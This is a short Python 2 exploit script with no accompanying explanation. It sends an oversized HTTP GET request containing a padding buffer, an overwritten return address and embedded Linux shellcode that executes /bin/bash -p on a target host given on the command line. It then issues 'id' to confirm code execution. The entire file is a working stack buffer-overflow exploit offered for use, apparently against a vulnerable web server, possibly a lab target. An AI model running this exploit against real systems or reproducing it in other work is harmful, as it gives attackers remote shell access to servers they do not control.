from socket import *
import sys, struct

SHELLCODE = ("\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70"
             "\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61"
             "\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52"
             "\x51\x53\x89\xe1\xcd\x80")

def main():
    ip = sys.argv[1]
    port = int(sys.argv[2])

    s = create_connection((ip, port))
    payload = 'GET ' + 'A' * 139 + 'MAGI' + ' HTTP/1.1'
    payload = payload.replace('MAGI', struct.pack('<L', 0xbffff8f8 + len(payload)))
    # payload += '\xcc\xcc\xcc\xcc'
    payload += SHELLCODE
    s.send(payload)
    data = s.recv(2048)
    s.send('id\nexit\n')
    data2 = s.recv(2048)
    s.close()
    print repr(data2)

if '__main__' == __name__:
    main()

